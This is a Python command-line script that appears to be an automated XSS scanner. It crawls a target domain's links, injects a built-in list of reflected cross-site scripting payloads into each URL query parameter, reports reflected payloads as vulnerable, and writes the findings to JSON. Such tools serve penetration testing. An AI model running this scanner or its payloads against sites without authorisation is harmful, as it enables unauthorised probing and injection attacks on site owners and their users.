import argparse
import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from bs4 import BeautifulSoup
import tldextract
import json
from concurrent.futures import ThreadPoolExecutor
import time

# 🎯 Default XSS Payloads
DEFAULT_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
    "';alert('XSS');//",
    "javascript:alert('XSS')",  # JavaScript URI scheme
    "' onfocus='alert(\"XSS\")' autofocus='true",  # Form-based
]

visited_urls = set()
output_results = []

def is_subdomain(url, domain):
    """Check if a URL belongs to the same domain or its subdomains."""
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """Crawl a given URL and return internal links."""
    urls = []
    try:
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
    except Exception as e:
        print(f"❌ Error crawling {url}: {e}")
    return urls

def test_xss(url, payloads):
    """Test XSS payloads on all parameters of a URL."""
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qsl(parsed_url.query))
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"

                print(f"🔍 Testing: {test_url}")
                response = requests.get(test_url, headers=headers, timeout=10)

                if payload.lower() in response.text.lower():
                    result = {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "status": "VULNERABLE"
                    }
                    output_results.append(result)
                    print(f"✅ [VULNERABLE] {test_url}")
                    return True
        print(f"🛡️ [SAFE] {url}")
    except Exception as e:
        print(f"❌ Error testing {url}: {e}")
    return False

def crawl_and_test(domain, output_file, depth, delay, payloads):
    """Crawl a domain and test for XSS vulnerabilities."""
    print(f"🚀 Starting scan on: {domain}")
    urls_to_test = [domain]
    current_depth = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        while urls_to_test and current_depth < depth:
            current_urls = urls_to_test[:10]
            urls_to_test = urls_to_test[10:]

            crawl_futures = [executor.submit(find_urls, url, domain) for url in current_urls]
            for future in crawl_futures:
                urls_to_test.extend(future.result())

            test_futures = [executor.submit(test_xss, url, payloads) for url in current_urls]
            for future in test_futures:
                future.result()

            current_depth += 1
            time.sleep(delay)

    with open(output_file, 'w') as f:
        json.dump(output_results, f, indent=4)
    print(f"\n📁 Results saved to: {output_file}")

def load_payloads(payloads_file):
    """Load custom payloads from a file."""
    try:
        with open(payloads_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"❌ Error loading payloads: {e}")
        return DEFAULT_PAYLOADS

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="🔍 Professional XSS Parameter Finder"
    )
    parser.add_argument(
        "domain", help="Target domain (e.g., https://example.com)"
    )
    parser.add_argument(
        "-o", "--output", default="xss_results.json", help="Output file name (default: xss_results.json)"
    )
    parser.add_argument(
        "-d", "--depth", type=int, default=3, help="Maximum crawl depth (default: 3)"
    )
    parser.add_argument(
        "--delay", type=float, default=1, help="Delay between requests in seconds (default: 1)"
    )
    parser.add_argument(
        "--payloads", help="File containing custom payloads (optional)"
    )

    args = parser.parse_args()
    payloads = load_payloads(args.payloads) if args.payloads else DEFAULT_PAYLOADS

    try:
        crawl_and_test(args.domain, args.output, args.depth, args.delay, payloads)
    except KeyboardInterrupt:
        print("\n❌ Interrupted by user.")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
